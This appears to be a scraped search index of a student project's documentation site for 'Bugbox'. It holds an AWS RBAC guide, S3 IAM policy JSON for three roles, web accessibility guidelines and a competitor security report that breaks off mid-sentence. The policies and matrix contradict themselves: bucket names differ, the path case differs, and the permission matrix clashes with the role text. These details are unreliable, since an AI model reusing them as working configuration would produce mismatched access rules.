Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#scope","content":" This document focuses on the following:  Defining and managing user roles and responsibilitiesAssigning appropriate permissions based on role requirementsBest practices for role-based access control in BugboxOverview of using IAM and S3 for enforcing these roles where needed  ","version":"Next","tagName":"h2"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#roles-and-responsibilities","content":" The following roles and responsibilities ensure that each user has the proper level of access based on their job function:  ","version":"Next","tagName":"h2"},{"title":"Administrator​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#administrator","content":" Full access to the Bugbox platform and all associated resources.Can manage users, define roles, and assign permissions.Responsible for ensuring system integrity and compliance with internal security standards.  ","version":"Next","tagName":"h3"},{"title":"Educator/Teacher​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#educatorteacher","content":" Access to view, upload, and manage content (e.g., lesson plans, student assignments) within specific areas.Cannot delete or modify other users’ data.Limited to specific permissions within Bugbox resources related to educational content.  ","version":"Next","tagName":"h3"},{"title":"Student​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#student","content":" Access to view and submit their own assignments.Cannot access, modify or delete files of other students’ data.Restricted permissions to their own folder within Bugbox’s storage.  ","version":"Next","tagName":"h3"},{"title":"Permission Matrix​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#permission-matrix","content":" This permission matrix defines the access level each role has within Bugbox:  Role\tCreate\tRead\tUpdate\tDelete\tView\tUploadAdmin\tYes\tYes\tYes\tYes\tYes\tYes Teacher\tYes\tYes\tYes\tYes\tYes\tYes Student\tNo\tNo\tYes\tNo\tYes\tYes  ","version":"Next","tagName":"h2"},{"title":"User Stories​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#user-stories","content":" ","version":"Next","tagName":"h2"},{"title":"Administrator User Story​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#administrator-user-story","content":" As an Administrator, I need full access to all platform resources, including the ability to create users, define roles, manage permissions, and ensure system integrity, so that I can maintain security and control over Bugbox operations.  ","version":"Next","tagName":"h3"},{"title":"Educator User Story​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#educator-user-story","content":" As an Educator, I need to manage my students' assignments, upload resources, and provide feedback, while being restricted from deleting or modifying other users’ data, so that I can effectively teach within a secure and structured environment.  ","version":"Next","tagName":"h3"},{"title":"Student User Story​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#student-user-story","content":" As a Student, I need to submit assignments to my own folder, view my progress, and upload content, while being unable to access or modify other students' work, so that I can focus on my learning in a private and secure environment.  ","version":"Next","tagName":"h3"},{"title":"How to Create Tags for Resource Organization and Access Control​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#how-to-create-tags-for-resource-organization-and-access-control","content":" Tags are used to help organize AWS resources logically and provide an extra layer of security by controlling access based on resource labels. Bugbox can implement tags for S3 buckets, IAM roles, and other AWS resources to manage access efficiently.  ","version":"Next","tagName":"h2"},{"title":"Steps to Create Tags:​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#steps-to-create-tags","content":" Navigate to AWS Management Console and go to the S3 service. Select the desired bucket (e.g., bugboxresourcesmain). Under the Properties tab, scroll down to the Tags section. Click on Add Tag and input the key-value pairs, such as: Key: ClassroomValue: ClassA Save the tag.  ","version":"Next","tagName":"h3"},{"title":"Access Control Using Tags:​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#access-control-using-tags","content":" Use the tags in IAM policies to control who can access specific resources. For example, a policy could restrict access to resources tagged as Classroom:ClassA to only users assigned to that class.  ","version":"Next","tagName":"h3"},{"title":"How to Create Users in IAM​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#how-to-create-users-in-iam","content":" To properly implement RBAC, administrators need to create IAM users for each individual and assign them the appropriate roles. Here's how:  Navigate to the AWS IAM Console and click Users.Click on Add User to create a new user.Enter the user’s username and select the type of access (Programmatic access for API, CLI, and Console access for web access).Under Permissions, choose one of the following: Attach existing policies directly: Select pre-defined policies like AdministratorAccess, ReadOnlyAccess, or custom policies.Create group: Place the user into a predefined group that has the appropriate permissions.Copy permissions from existing user: Copy permissions from another user with similar responsibilities. If applicable, assign tags to the user to help identify them based on their role, class, or other attributes.Review and Create User.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#conclusion","content":" By implementing RBAC with IAM and S3, Bugbox ensures that access to platform resources is secure, roles are clearly defined, and users only have access to what is necessary for their responsibilities. Tags enhance resource management and access control, while the IAM policy system ensures that permissions are correctly assigned, ensuring a compliant and secure environment for all users. ","version":"Next","tagName":"h2"},{"title":"Accessibility Guidelines for Developers","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Accessibility/guidelines","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#introduction","content":" Ensuring that applications and websites are accessible to all users, including those with disabilities, is crucial. We will focus on actionable guidelines to make digital content more inclusive. By following these steps, BugBox’s dev team can create applications that are navigable, usable, and enjoyable for everyone.  To achieve this, it’s essential to adhere to the Web Content Accessibility Guidelines (WCAG 2.1), which outline best practices for creating accessible web content. These guidelines focus on areas such as providing text alternatives for non-text content, ensuring keyboard navigation, improving color contrast, and making multimedia accessible. Following WCAG 2.1 ensures that your application is universally accessible, legally compliant, and inclusive for all users.  ","version":"Next","tagName":"h2"},{"title":"1. Provide Alternative Text for Images and Media​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#1-provide-alternative-text-for-images-and-media","content":" ","version":"Next","tagName":"h2"},{"title":"Goal:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#goal","content":" Ensure that non-text content like images, audio, and videos are accessible to users with visual and hearing impairments.  ","version":"Next","tagName":"h3"},{"title":"How to Do It:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#how-to-do-it","content":" Alt Text for Images: Always provide descriptive alt text for every image. Example: &lt;img src=&quot;robot.png&quot; alt=&quot;A small robot building blocks&quot;&gt; Transcripts for Audio: Provide a text version of all audio content. Example: &lt;audio controls&gt; &lt;source src=&quot;lesson.mp3&quot; type=&quot;audio/mp3&quot;&gt; &lt;p&gt;Your browser does not support the audio element. &lt;a href=&quot;transcript.txt&quot;&gt;Download the transcript here.&lt;/a&gt;&lt;/p&gt; &lt;/audio&gt; Captions for Videos: Include captions for all video content. Example: &lt;video controls&gt; &lt;source src=&quot;lesson.mp4&quot; type=&quot;video/mp4&quot;&gt; &lt;track src=&quot;captions_en.vtt&quot; kind=&quot;subtitles&quot; srclang=&quot;en&quot; label=&quot;English&quot;&gt; &lt;/video&gt;   ","version":"Next","tagName":"h3"},{"title":"Why:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#why","content":" Users with visual or hearing impairments need alternative text or transcripts to access non-text content. Without this, they may miss out on critical information.  ","version":"Next","tagName":"h3"},{"title":"2. Organize Content with Headings and Structure​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#2-organize-content-with-headings-and-structure","content":" ","version":"Next","tagName":"h2"},{"title":"Goal:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#goal-1","content":" Make content easy to navigate for all users, especially those using screen readers.  ","version":"Next","tagName":"h3"},{"title":"How to Do It:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#how-to-do-it-1","content":" Use Proper Headings: Organize content with a logical order of headings (&lt;h1&gt;, &lt;h2&gt;, etc.). Example: &lt;h1&gt;BugBox Overview&lt;/h1&gt; &lt;h2&gt;Introduction&lt;/h2&gt; &lt;h3&gt;What We Do&lt;/h3&gt; Add Navigation Landmarks: Use ARIA landmarks to define sections like navigation and main content. Example: &lt;nav role=&quot;navigation&quot;&gt; &lt;!-- Navigation links --&gt; &lt;/nav&gt; &lt;main role=&quot;main&quot;&gt; &lt;!-- Main content --&gt; &lt;/main&gt;   ","version":"Next","tagName":"h3"},{"title":"Why:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#why-1","content":" Clear headings and structured content help users, especially those with visual impairments, navigate the page more easily and understand its structure.  ","version":"Next","tagName":"h3"},{"title":"3. Improve Keyboard Navigation​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#3-improve-keyboard-navigation","content":" ","version":"Next","tagName":"h2"},{"title":"Goal:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#goal-2","content":" Ensure that all elements on the page can be used with the keyboard.  ","version":"Next","tagName":"h3"},{"title":"How to Do It:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#how-to-do-it-2","content":" Test with Keyboard: Navigate your site using only the Tab key and ensure all interactive elements are reachable. Ensure Focusable Elements: Ensure buttons, links, and form fields can be focused on and activated by the keyboard. Example: &lt;button&gt;Click Me&lt;/button&gt; &lt;!-- Should be accessible via keyboard --&gt; Create Custom Keyboard Shortcuts: For custom elements like sliders, make them keyboard accessible using ARIA roles.  ","version":"Next","tagName":"h3"},{"title":"Why:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#why-2","content":" Not all users can use a mouse, and ensuring full keyboard accessibility is vital for users with motor impairments or when using devices without a mouse.  ","version":"Next","tagName":"h3"},{"title":"4. Make Forms Accessible​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#4-make-forms-accessible","content":" ","version":"Next","tagName":"h2"},{"title":"Goal:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#goal-3","content":" Ensure forms are easy to use for all users, especially those with disabilities.  ","version":"Next","tagName":"h3"},{"title":"How to Do It:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#how-to-do-it-3","content":" Label Fields Clearly: Each form field should have a &lt;label&gt; linked to the field using the for attribute. Example: &lt;label for=&quot;username&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt; Group Related Fields: Use &lt;fieldset&gt; and &lt;legend&gt; to group related fields together. Example: &lt;fieldset&gt; &lt;legend&gt;Contact Information&lt;/legend&gt; &lt;label for=&quot;email&quot;&gt;Email&lt;/label&gt; &lt;input type=&quot;email&quot; id=&quot;email&quot; name=&quot;email&quot;&gt; &lt;/fieldset&gt; Ensure Good Contrast: Make sure text stands out from the background for users with low vision.  ","version":"Next","tagName":"h3"},{"title":"Why:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#why-3","content":" Clear labeling and grouping of form elements make it easier for users with disabilities to understand and complete forms.  ","version":"Next","tagName":"h3"},{"title":"5. Optimize for Different Screen Sizes​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#5-optimize-for-different-screen-sizes","content":" ","version":"Next","tagName":"h2"},{"title":"Goal:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#goal-4","content":" Ensure the app works seamlessly on all devices (mobile, tablet, desktop).  ","version":"Next","tagName":"h3"},{"title":"How to Do It:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#how-to-do-it-4","content":" Responsive Design: Use CSS media queries to adjust your design based on screen size. Example: @media screen and (max-width: 600px) { .container { flex-direction: column; } } Scalable Elements: Use relative units (like em or rem) instead of fixed sizes for fonts and layout elements.  ","version":"Next","tagName":"h3"},{"title":"Why:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#why-4","content":" Responsive design ensures your app is usable on any device, providing a smooth experience across mobile, tablet, and desktop platforms.  ","version":"Next","tagName":"h3"},{"title":"6. Simplify Navigation​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#6-simplify-navigation","content":" ","version":"Next","tagName":"h2"},{"title":"Goal:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#goal-5","content":" Make it easy for all users to find what they need.  ","version":"Next","tagName":"h3"},{"title":"How to Do It:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#how-to-do-it-5","content":" Keep Navigation Consistent: Ensure the main navigation is always in the same place across pages.Offer Multiple Navigation Methods: Include features like search, breadcrumbs, or a site map.Use ARIA Roles: Mark sections with ARIA roles like role=&quot;navigation&quot; and role=&quot;main&quot; to assist screen readers.  ","version":"Next","tagName":"h3"},{"title":"Why:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#why-5","content":" Simple, consistent navigation makes it easier for users to find content, especially for those who rely on screen readers or keyboard navigation.  ","version":"Next","tagName":"h3"},{"title":"7. Improve Color Usage​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#7-improve-color-usage","content":" ","version":"Next","tagName":"h2"},{"title":"Goal:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#goal-6","content":" Don’t rely on color alone to convey information.  ","version":"Next","tagName":"h3"},{"title":"How to Do It:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#how-to-do-it-6","content":" Use Color and Text Together: For errors or success messages, use both color and text (e.g., red text for errors, green for success).Check Contrast: Ensure sufficient contrast between text and background. Use a contrast checker to verify it meets accessibility guidelines.  ","version":"Next","tagName":"h3"},{"title":"Why:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#why-6","content":" Color blindness and other visual impairments can make it difficult for users to perceive information conveyed only by color. Adding text or icons helps make information clear to everyone.  ","version":"Next","tagName":"h3"},{"title":"8. Regular Testing and Feedback​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#8-regular-testing-and-feedback","content":" ","version":"Next","tagName":"h2"},{"title":"Goal:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#goal-7","content":" Ensure your app is accessible and usable.  ","version":"Next","tagName":"h3"},{"title":"How to Do It:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#how-to-do-it-7","content":" Test with Screen Readers: Use tools like NVDA (Windows) or VoiceOver (macOS) to test if content is being read aloud correctly.Use Accessibility Tools: Run automated tests using tools like WAVE or Lighthouse to catch common issues.Get User Feedback: Conduct testing with real users who have disabilities to find areas for improvement.  ","version":"Next","tagName":"h3"},{"title":"Why:​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#why-7","content":" Regular testing with real users and tools ensures your app remains accessible and usable for people with disabilities, helping you find and fix problems.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Accessibility Guidelines for Developers","url":"/redback-documentation/docs/project-5/Accessibility/guidelines#conclusion","content":" By following these accessibility guidelines, you can make your application more inclusive and usable for users with various disabilities. Consistently testing, incorporating feedback, and adhering to WCAG 2.1 standards will ensure your app is accessible, user-friendly, and compliant with legal requirements. ","version":"Next","tagName":"h2"},{"title":"S3 Policy and User Access Design","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/AWS/Policies","content":"","keywords":"","version":"Next"},{"title":"Key Concept: Policy with Dynamic Paths​","type":1,"pageTitle":"S3 Policy and User Access Design","url":"/redback-documentation/docs/project-5/AWS/Policies#key-concept-policy-with-dynamic-paths","content":" The policy dynamically assigns permissions to each student based on their username by using the variable ${aws:username}. This ensures that each student can only access their own files.  ","version":"Next","tagName":"h2"},{"title":"Student's Policy​","type":1,"pageTitle":"S3 Policy and User Access Design","url":"/redback-documentation/docs/project-5/AWS/Policies#students-policy","content":" Objective: Students should only be able to upload their files into their respective folders and should not have access to any data outside their folders.  ","version":"Next","tagName":"h2"},{"title":"Example Workflow​","type":1,"pageTitle":"S3 Policy and User Access Design","url":"/redback-documentation/docs/project-5/AWS/Policies#example-workflow","content":" A student uploads Sample.txt to the S3 bucket.After applying a specific policy, the file's path becomes: bugboxresourcemain/Students/Assignments/${aws:username}/Sample.txt   ","version":"Next","tagName":"h3"},{"title":"Breakdown​","type":1,"pageTitle":"S3 Policy and User Access Design","url":"/redback-documentation/docs/project-5/AWS/Policies#breakdown","content":" Bucket Name: bugboxresourcemainFile Directory: Students/Assignments/${aws:username}  ","version":"Next","tagName":"h3"},{"title":"JSON Policy for Students​","type":1,"pageTitle":"S3 Policy and User Access Design","url":"/redback-documentation/docs/project-5/AWS/Policies#json-policy-for-students","content":" { &quot;Version&quot;: &quot;2012-10-17&quot;, &quot;Statement&quot;: [ { &quot;Sid&quot;: &quot;VisualEditor1&quot;, &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: &quot;s3:PutObject&quot;, &quot;Resource&quot;: &quot;arn:aws:s3:::bugboxresourcesmain/Students/assignments/${aws:username}/*&quot; }, { &quot;Sid&quot;: &quot;VisualEditor2&quot;, &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: &quot;s3:GetObject&quot;, &quot;Resource&quot;: &quot;arn:aws:s3:::bugboxresourcesmain/Students/assignments/${aws:username}/*&quot; }, { &quot;Sid&quot;: &quot;VisualEditor3&quot;, &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: &quot;s3:ListAllMyBuckets&quot;, &quot;Resource&quot;: &quot;*&quot; } ] }     ","version":"Next","tagName":"h3"},{"title":"Dynamic Path Based on User Login​","type":1,"pageTitle":"S3 Policy and User Access Design","url":"/redback-documentation/docs/project-5/AWS/Policies#dynamic-path-based-on-user-login","content":" The file path dynamically changes based on the student who logs in:  When StudentUser1 logs in: bugboxresourcemain/Students/Assignments/StudentUser1 When StudentUser2 logs in: bugboxresourcemain/Students/Assignments/StudentUser2     ","version":"Next","tagName":"h2"},{"title":"Teacher's Policy​","type":1,"pageTitle":"S3 Policy and User Access Design","url":"/redback-documentation/docs/project-5/AWS/Policies#teachers-policy","content":" Objective: Teachers have broader access to all directories under Assignments/.  ","version":"Next","tagName":"h2"},{"title":"JSON Policy for Teachers​","type":1,"pageTitle":"S3 Policy and User Access Design","url":"/redback-documentation/docs/project-5/AWS/Policies#json-policy-for-teachers","content":" { &quot;Version&quot;: &quot;2012-10-17&quot;, &quot;Statement&quot;: [ { &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: [ &quot;s3:PutObject&quot; ], &quot;Resource&quot;: [ &quot;arn:aws:s3:::bugboxresourcesmain/Students/assignments/*&quot;, &quot;arn:aws:s3:::bugboxresourcesmain/Teachers/${aws:username}/*&quot; ] }, { &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: [ &quot;s3:GetObject&quot; ], &quot;Resource&quot;: [ &quot;arn:aws:s3:::bugboxresourcesmain/Students/assignments/*&quot;, &quot;arn:aws:s3:::bugboxresourcesmain/Teachers/${aws:username}/*&quot; ] }, { &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: [ &quot;s3:DeleteObject&quot; ], &quot;Resource&quot;: [ &quot;arn:aws:s3:::bugboxresourcesmain/Students/assignments/*&quot;, &quot;arn:aws:s3:::bugboxresourcesmain/Teachers/${aws:username}/*&quot; ] }, { &quot;Sid&quot;: &quot;VisualEditor3&quot;, &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: &quot;s3:ListAllMyBuckets&quot;, &quot;Resource&quot;: &quot;*&quot; } ] }     ","version":"Next","tagName":"h3"},{"title":"Admin's Policy​","type":1,"pageTitle":"S3 Policy and User Access Design","url":"/redback-documentation/docs/project-5/AWS/Policies#admins-policy","content":" Objective: Admins have unrestricted access to all directories under both Students/ and Teachers/.  ","version":"Next","tagName":"h2"},{"title":"JSON Policy for Admins​","type":1,"pageTitle":"S3 Policy and User Access Design","url":"/redback-documentation/docs/project-5/AWS/Policies#json-policy-for-admins","content":" { &quot;Version&quot;: &quot;2012-10-17&quot;, &quot;Statement&quot;: [ { &quot;Sid&quot;: &quot;VisualEditor1&quot;, &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: &quot;s3:PutObject&quot;, &quot;Resource&quot;: [ &quot;arn:aws:s3:::bugboxresourcesmain/Students/*&quot;, &quot;arn:aws:s3:::bugboxresourcesmain/Teachers/*&quot; ] }, { &quot;Sid&quot;: &quot;VisualEditor2&quot;, &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: &quot;s3:GetObject&quot;, &quot;Resource&quot;: [ &quot;arn:aws:s3:::bugboxresourcesmain/Students/*&quot;, &quot;arn:aws:s3:::bugboxresourcesmain/Teachers/*&quot; ] }, { &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: &quot;s3:DeleteObject&quot;, &quot;Resource&quot;: [ &quot;arn:aws:s3:::bugboxresourcesmain/Students/*&quot;, &quot;arn:aws:s3:::bugboxresourcesmain/Teachers/*&quot; ] }, { &quot;Sid&quot;: &quot;VisualEditor3&quot;, &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: &quot;s3:ListAllMyBuckets&quot;, &quot;Resource&quot;: &quot;*&quot; } ] }     ","version":"Next","tagName":"h3"},{"title":"Summary​","type":1,"pageTitle":"S3 Policy and User Access Design","url":"/redback-documentation/docs/project-5/AWS/Policies#summary","content":" Data Isolation: Students are assigned individual directories under bugboxresourcemain/Students/Assignments/.Dynamic Access: Policies leverage ${aws:username} to ensure automatic and secure folder assignment based on the logged-in user.Teacher and Admin Privileges: Teachers have access to all student directories, while admins have unrestricted access to all directories.Ease of Management: No manual intervention is needed to create or assign folders.Security: Unauthorized access is strictly prevented through specific policies. ","version":"Next","tagName":"h2"},{"title":"Competitors Research Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report","content":"","keywords":"","version":"Next"},{"title":"Importance of Cybersecurity​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#importance-of-cybersecurity","content":" For a startup like Bugbox, which focuses on integrating technology into classrooms with engaging and gamified learning experiences, cybersecurity is crucial for several reasons such as protecting sensitive data, maintaining trust with educators and schools, compliance with regulations and ensuring platform integrity. A strong cybersecurity infrastructure is also vital to prevent popular forms of cyberattack such as Distributed Denial of Service (DDoS) attacks. Additionally, cybersecurity is essential to safeguarding intellectual property as Bugbox’s innovative curriculum and gamified learning experiences are valuable intellectual property. Effective cybersecurity helps protect these assets from theft and unauthorised access which is essential for maintain Bugbox’s competitive edge and ensuring the continued growth of the company.  ","version":"Next","tagName":"h2"},{"title":"Competitors approach to Cybersecurity​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#competitors-approach-to-cybersecurity","content":" Here we will look at some of Bugbox’s direct competitors and analyse their approaches to cybersecurity. These competitors include tinkercad, Lego Spike, mbot and microbit.  ","version":"Next","tagName":"h2"},{"title":"Competitor 1 - Tinkercad (by Autodesk)​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#competitor-1---tinkercad-by-autodesk","content":"     ","version":"Next","tagName":"h2"},{"title":"Approach to Cybersecurity​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#approach-to-cybersecurity","content":" Tinkercad, an online 3D design and modeling tool, is part of Autodesk, which is known for its strong commitment to security. Tinkercad uses HTTPS for secure communication, ensuring data transmitted between users and the platform is encrypted. Autodesk implements multi-factor authentication (MFA) for its services to enhance account security. Regular updates and security patches are applied to address vulnerabilities. Tinkercad also has comprehensive privacy policies and terms of service that comply with global data protection regulations, including GDPR.  ","version":"Next","tagName":"h3"},{"title":"Key Security Features​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#key-security-features","content":" Encryption: Data is encrypted during transmission with HTTPS.  Authentication: Multi-factor authentication (MFA) is used.  Privacy Policies: Compliant with data protection regulations like GDPR.  ","version":"Next","tagName":"h3"},{"title":"Competitor 2 - Lego Spike​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#competitor-2---lego-spike","content":"     ","version":"Next","tagName":"h2"},{"title":"Approach to Cybersecurity​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#approach-to-cybersecurity-1","content":" LEGO SPIKE Prime, a robotics and coding kit for education, is part of the LEGO Group, which adheres to stringent data protection and security measures. LEGO SPIKE devices communicate with the LEGO Education software, which uses secure, encrypted communication channels. LEGO Education also ensures that software updates are delivered securely and regularly. Privacy policies are designed to protect user data, especially since LEGO SPIKE is used in educational environments where data protection is crucial.  ","version":"Next","tagName":"h3"},{"title":"Key Security Features​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#key-security-features-1","content":" Encryption: Secure communication channels for data exchange.  Updates: Regular and secure software updates.  Privacy Policies: Strong focus on protecting user data in educational settings.  ","version":"Next","tagName":"h3"},{"title":"Competitor 3 - mBot (by Makeblock)​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#competitor-3---mbot-by-makeblock","content":"     ","version":"Next","tagName":"h2"},{"title":"Approach to Cybersecurity​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#approach-to-cybersecurity-2","content":" Makeblock's mBot is a programmable robot used for educational purposes. The company employs basic cybersecurity practices, including encrypted communication between the mBot and its associated software. Makeblock provides firmware updates to address vulnerabilities and enhance security. User data protection is addressed through privacy policies, although the specifics might vary depending on regional regulations. The company is responsive to security issues, releasing updates as needed.  ","version":"Next","tagName":"h3"},{"title":"Key Security Features​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#key-security-features-2","content":" Encryption: Basic encryption for communication.  Updates: Firmware updates to address security vulnerabilities.  Privacy Policies: Address user data protection, with regional variations.  ","version":"Next","tagName":"h3"},{"title":"Competitor 4 - Micro (by the Micro Educational Foundation)​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#competitor-4---micro-by-the-micro-educational-foundation","content":"     ","version":"Next","tagName":"h2"},{"title":"Approach to Cybersecurity​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#approach-to-cybersecurity-3","content":" The Micro Educational Foundation focuses on providing a secure environment for learning and coding with the Micro microcontroller. The platform uses HTTPS to encrypt data transmitted between the Micro and associated software. The Foundation provides regular software updates and has a clear privacy policy to protect user data. Additionally, they promote secure coding practices and offer resources to help educators and students understand cybersecurity basics.  ","version":"Next","tagName":"h3"},{"title":"Key Security Features​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#key-security-features-3","content":" Encryption: Data is transmitted securely using HTTPS.  Updates: Regular software updates for security.  Privacy Policies: Clear policies to protect user data and promote secure coding practices.  ","version":"Next","tagName":"h3"},{"title":"Summary​","type":1,"pageTitle":"Competitors Research Report","url":"/redback-documentation/docs/project-5/Cyber Security Recommendations/Competitors-Report#summary","content":" Each competitor employs a range of cybersecurity measures to protect user data and ensure secure interactions with their platforms. Tinkercad and LEGO SPIKE emphasize encrypted communication and strong privacy policies, while mBot focuses on basic encryption and firmware updates. Micro combines secure data transmission with educational resources to promote cybersecurity awareness. For Bugbox, adopting similar practices—such as encryption, regular updates and strong privacy policies—will be crucial in 